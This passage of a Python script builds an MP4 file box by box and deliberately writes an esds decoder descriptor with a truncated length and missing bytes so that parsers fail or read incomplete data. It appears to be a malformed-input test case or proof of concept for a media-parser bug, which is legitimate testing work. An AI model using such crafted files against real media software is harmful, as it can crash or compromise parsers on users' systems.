figDescrTag\nesds_data += b\'\\x03\'  # length = 3 (too short! should be at least 13)\n# This will cause parsing to fail or create incomplete decoderConfig\nesds_data += b\'\\x40\'  # objectTypeIndication (Audio ISO/IEC 14496-3)\nesds_data += b\'\\x15\'  # streamType(5 bits)=0x05(audio), upstream=0, reserved=1\nesds_data += b\'\\x00\'  # bufferSizeDB (partial, missing bytes)\n\n# SLConfigDescriptor tag 0x06\nesds_data += b\'\\x06\'  # SLConfigDescrTag  \nesds_data += b\'\\x01\'  # length = 1\nesds_data += b\'\\x02\'  # predefined = 2\n\nesds = write_box(b\'esds\', esds_data)\n\n# mp4a sample entry\nmp4a_data = b\'\\x00\' * 6  # reserved[6]\nmp4a_data += struct.pack(\'>H\', 1)  # data_reference_index\nmp4a_data += b\'\\x00\' * 8  # reserved[8] for audio\nmp4a_data += struct.pack(\'>HH\', 2, 16)  # channelcount=2, samplesize=16\nmp4a_data += struct.pack(\'>HH\', 0, 0)  # pre_defined, reserved\nmp4a_data += struct.pack(\'>I\', 44100 << 16)  # samplerate (fixed point 16.16)\nmp4a_data += esds\nmp4a = write_box(b\'mp4a\', mp4a_data)\n\n# Sample description box (stsd)\nstsd_data = struct.pack(\'>I\', 0)  # version=0, flags=0\nstsd_data += struct.pack(\'>I\', 1)  # entry_count\nstsd_data += mp4a\nstsd = write_box(b\'stsd\', stsd_data)\n\n# Time to sample box (stts)\nstts_data = struct.pack(\'>I\', 0)  # version=0, flags=0\nstts_data += struct.pack(\'>I\', 1)  # entry_count\nstts_data += struct.pack(\'>II\', 1, 1024)  # sample_count, sample_delta\nstts = write_box(b\'stts\', stts_data)\n\n# Sample to chunk box (stsc)\nstsc_data = struct.pack(\'>I\', 0)  # version=0, flags=0\nstsc_data += struct.pack(\'>I\', 1)  # entry_count\nstsc_data += struct.pack(\'>III\', 1, 1, 1)  # first_chunk, samples_per_chunk, sample_description_index\nstsc = write_box(b\'stsc\', stsc_data)\n\n# Sample size box (stsz)\nstsz_data = struct.pack(\'>I\', 0)  # version=0, flags=0\nstsz_data += struct.pack(\'>II\', 0, 1)  # sample_size=0 (variable), sample_count=1\nstsz_data += struct.pack(\'>I\', 100) 